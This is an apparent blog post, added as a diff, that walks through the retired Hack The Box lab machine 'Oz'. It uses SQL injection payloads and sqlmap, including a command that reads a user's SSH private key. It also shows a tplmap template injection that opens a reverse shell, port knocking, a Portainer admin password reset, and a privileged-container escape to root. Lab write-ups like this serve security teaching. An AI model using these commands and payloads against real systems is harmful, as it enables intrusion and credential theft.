@@ -1,0 +1,182 @@
+<hr />
+
+<h3 id="quick-summary">Quick Summary</h3>
+<h4 id="hey-im-back-with-another-hack-the-box-write-up--this-time-oz-has-retired-and-it-was-rated-as-a-hard-box-i-enjoyed-this-box--it-was-really-fun-it-had-some-docker-tricks-which-were-very-cool--its-a-linux-box-and-its-ip-is-10101096-so-lets-jump-right-in">Hey I’m back with another Hack The Box write-up , this time Oz has retired and it was rated as a hard box. I enjoyed this box , it was really fun. It had some docker tricks which were very cool , It’s a linux box and it’s ip is 10.10.10.96 so let’s jump right in.</h4>
+<h4 id="check-out-my-other-hack-the-box-write-ups">Check out my <a href="/categories">other Hack The Box write-ups</a></h4>
+<p><img src="/images/hackthebox/oz/0.png" alt="" /></p>
+<hr />
+
+<h3 id="nmap">Nmap</h3>
+<h4 id="as-always-we-will-start-by-running-nmap-to-scan-for-open-ports-and-services">As always we will start by running nmap to scan for open ports and services.</h4>
+<p><code class="highlighter-rouge">nmap -sV -sT -o nmapinitial oz.htb</code></p>
+<h4 id="note--i-added-the-ip-to-my-etchosts-file-as-ozhtb">Note : I added the ip to my /etc/hosts file as oz.htb</h4>
+<p><img src="/images/hackthebox/oz/1.png" alt="" /></p>
+<h4 id="and-we-see-only-http-on-port-80-and-8080-we-also-see-that-its-running-a-python-server">And we see only http on port 80 and 8080. We also see that it’s running a python server.</h4>
+<p><br /></p>
+<hr />
+
+<h3 id="enumerating-http">Enumerating http</h3>
+<h4 id="on-port-80-theres-a-web-page-with-the-title-oz-webapi-and-its-asking-us-to-register-a-username">On port 80 there’s a web page with the title “OZ Webapi” and it’s asking us to register a username.</h4>
+<p><img src="/images/hackthebox/oz/2.png" alt="" /></p>
+<h4 id="on-port-8080-we-see-a-login-page">On port 8080 we see a login page.</h4>
+<p><img src="/images/hackthebox/oz/3.png" alt="" /></p>
+<h4 id="if-we-tried-running-gobuster-on-port-80-to-find-hidden-dirs-and-files-we-will-get-a-wildcard-response">If we tried running gobuster on port 80 to find hidden dirs and files we will get a wildcard response.</h4>
+<p><img src="/images/hackthebox/oz/4.png" alt="" /></p>
+<h4 id="and-thats-because-the-server-doesnt-respond-with-404-instead-of-404--when-we-request-a-non-existing-page-the-server-responds-with-a-line-of-random-chars">And that’s because the server doesn’t respond with 404. Instead of 404 , when we request a non-existing page the server responds with a line of random chars.</h4>
+<h4 id="here-i-requested-httpozhtbanything">Here I requested <code class="highlighter-rouge">http://oz.htb/anything</code></h4>
+<p><img src="/images/hackthebox/oz/5.png" alt="" /></p>
+<h4 id="and-this-makes-it-hard-to-enumerate-because-we-will-always-get-a-200-response-so-what-are-we-going-to-do-is-to-use-wfuzz-to-filter-the-responses-for-us">And this makes it hard to enumerate because we will always get a 200 response. So what are we going to do is to use wfuzz to filter the responses for us.</h4>
+<p><code class="highlighter-rouge">wfuzz -u http://oz.htb/FUZZ/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hl 0</code></p>
+<h4 id="this-wont-show-us-any-response-with-0-lines">This won’t show us any response with 0 lines.</h4>
+<p><img src="/images/hackthebox/oz/6.png" alt="" /></p>
+<h4 id="after-a-few-seconds-we-get-users">After a few seconds we get /users/</h4>
+<p><br /></p>
+<hr />
+
+<h3 id="sql-injection">SQL Injection</h3>
+<h4 id="when-we-visit-users-in-the-browser-we-get-the-default-response--please-register-a-username">When we visit /users/ in the browser we get the default response : please register a username.</h4>
+<p><img src="/images/hackthebox/oz/7.png" alt="" /></p>
+<h4 id="so-we-have-users-which-is-a-valid-path--what-happens-if-we-tried-a-username-that-probably-exists-something-like-admin-">So we have /users/ which is a valid path , what happens if we tried a username that probably exists, something like admin ?</h4>
+<p><img src="/images/hackthebox/oz/8.png" alt="" /></p>
+<h4 id="we-get-a-json-response-username--admin">We get a json response <code class="highlighter-rouge">username : "admin"</code></h4>
+<h4 id="lets-try-a-single-quote-">Let’s try a single quote <code class="highlighter-rouge">'</code></h4>
+<p><img src="/images/hackthebox/oz/9.png" alt="" /></p>
+<h4 id="we-get-500-internal-server-error-so-this-endpoint-is-probably-vulnerable-to-sql-injection--lets-try-something-else--or-1-or">We get 500 Internal Server Error, So this endpoint is probably vulnerable to SQL injection , Let’s try something else , <code class="highlighter-rouge">'OR 1 OR'</code></h4>
+<p><img src="/images/hackthebox/oz/10.png" alt="" /></p>
+<h4 id="we-get-another-username--dorthi--so-this-is-a-confirmation-that-its-vulnerable-to-sqli--lets-do-another-injection-and-see-if-we-can-enumerate-users">We get another username : “dorthi” , So this is a confirmation that it’s vulnerable to sqli , Let’s do another injection and see if we can enumerate users</h4>
+<p><code class="highlighter-rouge">' or length(username)='4</code>
+<img src="/images/hackthebox/oz/11.png" alt="" /></p>
+<h4 id="another-username--toto">Another username : “toto”</h4>
+<h4 id="lets-try-7">Let’s try 7</h4>
+<p><img src="/images/hackthebox/oz/12.png" alt="" /></p>
+<h4 id="tinman">tin.man</h4>
+<h4 id="so-we-confirmed-its-sqli--the-next-step-is-to-use-sqlmap">So we confirmed it’s sqli , The next step is to use sqlmap.</h4>
+<p><code class="highlighter-rouge">sqlmap -u http://10.10.10.96/users/toto --all</code></p>
+<h4 id="this-will-dump-the-whole-database">This will dump the whole database</h4>
+<p><img src="/images/hackthebox/oz/13.png" alt="" /></p>
+<h4 id="after-some-time-it-will-start-dumping-tables-and-we-will-notice-an-interesting-table-users_gbw">After some time it will start dumping tables and we will notice an interesting table <code class="highlighter-rouge">users_gbw</code></h4>
+<p><img src="/images/hackthebox/oz/14.png" alt="" /></p>
+<h4 id="so-if-we-try-to-crack-those-hashes-the-only-one-that-will-crack-is-wizardoz--wizardofoz22">So if we try to crack those hashes the only one that will crack is wizard.oz : <code class="highlighter-rouge">wizardofoz22</code></h4>
+<h4 id="now-we-have-a-username-and-its-password-lets-login-to-port-8080">Now we have a username and its password let’s login to port 8080</h4>
+<p><img src="/images/hackthebox/oz/15.png" alt="" />
+<br />
+<br />
+<br />
+<img src="/images/hackthebox/oz/16.png" alt="" /></p>
+<h4 id="and-success-">And success !</h4>
+<p><br /></p>
+<hr />
+
+<h3 id="dorthis-ssh-key">Dorthi’s ssh key</h3>
+<h4 id="we-login-to-something-that-looks-like-a-ticketing-system-after-reading-the-tickets-we-will-find-2-interesting-tickets">We login to something that looks like a ticketing system, After reading the tickets we will find 2 interesting tickets.</h4>
+<p><img src="/images/hackthebox/oz/17.png" alt="" />
+<br />
+<br />
+<br />
+<img src="/images/hackthebox/oz/18.png" alt="" />
+<br />
+<br />
+<br />
+<img src="/images/hackthebox/oz/19.png" alt="" /></p>
+<h4 id="so-this-ssh-key-is-on-the-database-and-we-have-sqli-on-that-database--lets-grab-it">So this ssh key is on the database and we have sqli on that database , Let’s grab it.</h4>
+<p><code class="highlighter-rouge">sqlmap -u "http://10.10.10.96/users/toto" --string "username" --file-read "/home/dorthi/.ssh/id_rsa" -v1</code>
+<img src="/images/hackthebox/oz/20.png" alt="" />
+<br />
+<br />
+<br />
+<img src="/images/hackthebox/oz/21.png" alt="" />
+<br />
+<br />
+<br />
+<img src="/images/hackthebox/oz/22.png" alt="" /></p>
+<h4 id="cool-so-now-we-can-ssh-and-own-user-no-wait-">Cool so now we can ssh and own user, No wait …</h4>
+<h4 id="by-looking-at-the-nmap-scan-again">By looking at the nmap scan again:</h4>
+<p><img src="/images/hackthebox/oz/1.png" alt="" /></p>
+<h4 id="theres-no-ssh-listening-">There’s no ssh listening !</h4>
+<p><br /></p>
+<hr />
+
+<h3 id="server-side-template-injection">Server Side Template Injection</h3>
+<h4 id="if-we-return-to-that-ticketing-system-we-will-see-that-we-can-add-a-ticket--it-asks-us-for-a-name-and-a-description">If we return to that ticketing system we will see that we can add a ticket , it asks us for a name and a description.</h4>
+<p><img src="/images/hackthebox/oz/23.png" alt="" /></p>
+<h4 id="by-capturing-that-request-in-burp-we-will-see-a-post-request-with-two-parameters-name-and-desc">By capturing that request in burp we will see a POST request with two parameters name and desc.</h4>
+<p><img src="/images/hackthebox/oz/24.png" alt="" /></p>
+<h4 id="and-the-response-outputs-them">And the response outputs them.</h4>
+<p><img src="/images/hackthebox/oz/25.png" alt="" /></p>
+<h4 id="if-we-used-tplmap-a-tool-like-sqlmap-for-automatic-template-injection-exploitation-we-will-find-that-its-vulnerable">If we used <a href="https://github.com/epinna/tplmap">tplmap</a> (a tool like sqlmap for automatic template injection exploitation) we will find that it’s vulnerable.</h4>
+<p><code class="highlighter-rouge">python tplmap.py -u 'http://10.10.10.96:8080' -X POST -d 'name=*&amp;desc=anything' -c 'token=TOKEN' --reverse-shell 10.10.xx.xx 1337</code>
+<img src="/images/hackthebox/oz/26.png" alt="" />
+<br />
+<br />
+<br />
+<img src="/images/hackthebox/oz/27.png" alt="" /></p>
+<h4 id="then-we-check-our-listener--we-will-get-a-reverse-shell">Then we check our listener , we will get a reverse shell.</h4>
+<p><br /></p>
+<hr />
+
+<h3 id="knock--knock">Knock , Knock</h3>
+<h4 id="after-some-enumeration-we-will-find-in--two-unusual-dirs-containers-and-secret--in-secret-there-is-a-file-called-knockdconf">After some enumeration we will find in <code class="highlighter-rouge">/</code> two unusual dirs <code class="highlighter-rouge">containers</code> and <code class="highlighter-rouge">.secret</code> , in <code class="highlighter-rouge">.secret</code> there is a file called <code class="highlighter-rouge">knockd.conf</code></h4>
+<p><img src="/images/hackthebox/oz/28.png" alt="" /></p>
+<h4 id="thats-a-configuration-file-for-ssh-port-knocking-port-knocking-means-that-in-order-to-connect-to-an-ssh-server-you-need-to-ping-some-ports-in-a-specific-sequence-to-be-able-to-connect">That’s a configuration file for ssh port knocking, Port knocking means that in order to connect to an ssh server you need to ping some ports in a specific sequence to be able to connect.</h4>
+<p><img src="/images/hackthebox/oz/29.png" alt="" /></p>
+<h4 id="in-our-situation-the-ports-are-40809-50212-46969-and-all-of-them-are-udp">In our situation the ports are 40809 50212 46969 and all of them are udp</h4>
+<h4 id="in-the-other-dir-containers-theres-a-dir-called-database-which-has-some-files-one-of-them-is-called-startsh">In the other dir <code class="highlighter-rouge">containers</code> there’s a dir called <code class="highlighter-rouge">database</code> which has some files, One of them is called <code class="highlighter-rouge">start.sh</code></h4>
+<p><img src="/images/hackthebox/oz/30.png" alt="" /></p>
+<h4 id="and-we-grabbed-some-passwords-maybe-we-will-need-them-later">And we grabbed some passwords maybe we will need them later.</h4>
+<h4 id="now-we-know-the-port-sequence-lets-ssh-into-the-box-we-can-use-knockd-to-do-that-but-i-used-a-small-script-that-uses-nmap">Now we know the port sequence let’s ssh into the box. We can use knockd to do that but I used a small script that uses nmap.</h4>
+<p><img src="/images/hackthebox/oz/31.png" alt="" /></p>
+<h4 id="we-chmod-600-to-the-key-then-execute-our-script">We <code class="highlighter-rouge">chmod 600</code> to the key then execute our script.</h4>
+<p><img src="/images/hackthebox/oz/32.png" alt="" /></p>
+<h4 id="the-key-is-protected-with-a-password--lets-try-the-db-password-we-found-earlier--n0pl4c3l1keh0me">The key is protected with a password , Let’s try the db password we found earlier : “N0Pl4c3L1keH0me”</h4>
+<p><img src="/images/hackthebox/oz/33.png" alt="" /></p>
+<h4 id="and-we-owned-user-">And we owned user !</h4>
+<p><br /></p>
+<hr />
+
+<h3 id="portainer">Portainer</h3>
+<h4 id="after-some-regular-enumeration-if-we-do-sudo--l-we-will-find-that-dorthi-can-run-some-commands-as-root-docker-network-ls-and-docker-network-inspect-">After some regular enumeration if we do sudo -l we will find that dorthi can run some commands as root <code class="highlighter-rouge">docker network ls</code> and <code class="highlighter-rouge">docker network inspect *</code></h4>
+<p><img src="/images/hackthebox/oz/34.png" alt="" /></p>
+<h4 id="lets-first-list-the-networks">Let’s first list the networks</h4>
+<p><code class="highlighter-rouge">sudo docker network ls</code>
+<img src="/images/hackthebox/oz/35.png" alt="" /></p>
+<h4 id="we-see-some-networks-lets-inspect-the-first-one-bridge">We see some networks let’s inspect the first one <code class="highlighter-rouge">bridge</code></h4>
+<p><code class="highlighter-rouge">sudo docker network inspect bridge</code>
+<img src="/images/hackthebox/oz/36.png" alt="" /></p>
+<h4 id="we-find-portainer-1111-and-its-ip-is-1721702--portainer-is-the-user-interface-for-docker-management-and-it-usually-runs-http-on-port-9000--we-can-also-check-that-by-using-nmap-luckily-its-installed-on-the-box">We find <code class="highlighter-rouge">portainer-1.11.1</code> and its ip is <code class="highlighter-rouge">172.17.0.2</code> , Portainer is the user interface for docker management and it usually runs http on port 9000 , we can also check that by using nmap. Luckily it’s installed on the box.</h4>
+<p><img src="/images/hackthebox/oz/37.png" alt="" /></p>
+<h4 id="and-we-see-that-port-9000-is-listening--so-now-we-need-to-set-up-an-ssh-port-forwarding-to-be-able-to-access-that-portainer">And we see that port 9000 is listening , so now we need to set up an ssh port forwarding to be able to access that portainer.</h4>
+<h4 id="we-can-edit-the-ssh-port-knocking-script-to-add-the-forwarding-command">We can edit the ssh port knocking script to add the forwarding command.</h4>
+<p><img src="/images/hackthebox/oz/38.png" alt="" /></p>
+<h4 id="now-when-we-visit-localhost-on-port-9000-we-get-a-login-page">Now when we visit localhost on port 9000 we get a login page.</h4>
+<p><img src="/images/hackthebox/oz/39.png" alt="" /></p>
+<h4 id="by-using-the-http-api-as-documented-here-we-can-re-assign-the-admin-password-by-sending-a-post-request-to-apiusersadmininit-with-data-as--usernameadminpasswordnew-password">By using the HTTP API as documented <a href="https://gist.github.com/deviantony/77026d402366b4b43fa5918d41bc42f8">here</a> we can re-assign the admin password by sending a POST request to <code class="highlighter-rouge">/api/users/admin/init</code> with data as : <code class="highlighter-rouge">{"username":"admin","password":"new-password"}</code></h4>
+<h4 id="i-did-it-with-burp-and-set-the-password-to-l0c4l-">I did it with burp and set the password to <code class="highlighter-rouge">l0c4l</code> :</h4>
+<p><img src="/images/hackthebox/oz/40.png" alt="" />
+<br />
+<br />
+<br />
+<img src="/images/hackthebox/oz/41.png" alt="" />
+<br /></p>
+<hr />
+
+<h3 id="root">Root</h3>
+<h4 id="after-we-login-we-will-see-the-dashboard-showing-the-status-of-the-containers">After we login we will see the dashboard showing the status of the containers.</h4>
+<p><img src="/images/hackthebox/oz/42.png" alt="" /></p>
+<h4 id="in-the-containers-tab-there-are-4-container-running">In the containers tab there are 4 container running.</h4>
+<p><img src="/images/hackthebox/oz/43.png" alt="" /></p>
+<h4 id="if-we-check-the-container-webapi-we-can-use-its-console">If we check the container webapi we can use its console.</h4>
+<p><img src="/images/hackthebox/oz/44.png" alt="" /></p>
+<h4 id="we-can-create-a-new-container-with-the-image-of-webapi-and-mount-root-or-the-whole-filesystem--then-use-the-console-to-access-it">We can create a new container with the image of webapi and mount <code class="highlighter-rouge">/root</code> or the whole filesystem <code class="highlighter-rouge">/</code> then use the console to access it.</h4>
+<h4 id="first-we-will-grab-the-image-name-from-the-images-tab--webapilatest">First we will grab the image name from the images tab : “webapi:latest”</h4>
+<p><img src="/images/hackthebox/oz/45.png" alt="" /></p>
+<h4 id="then-we-will-create-a-container-and-name-it-anything--i-named-it-nicecontainer--add-the-image--then-add-a-volume-with-path-root-and-mount-it-to-mnt">Then we will create a container and name it anything , I named it “NiceContainer” , add the image , then add a volume with path <code class="highlighter-rouge">/root</code> and mount it to /mnt/</h4>
+<p><img src="/images/hackthebox/oz/46.png" alt="" /></p>
+<h4 id="then-from-the-security-tab-we-choose-privileged-mode">Then from the security tab we choose privileged mode.</h4>
+<p><img src="/images/hackthebox/oz/47.png" alt="" /></p>
+<h4 id="click-create--use-the-console--cd-mnt-and-we-own-root--d">Click create , Use the console , <code class="highlighter-rouge">cd /mnt</code> and we own root ! :D</h4>
+<p><img src="/images/hackthebox/oz/48.png" alt="" />
+<br /></p>
+<h4 id="and-that-was-oz">And that was Oz.</h4>
+<h4 id="feedback-is-appreciated--thanks-for-reading-">Feedback is appreciated , Thanks for reading !</h4>
+<hr />
+
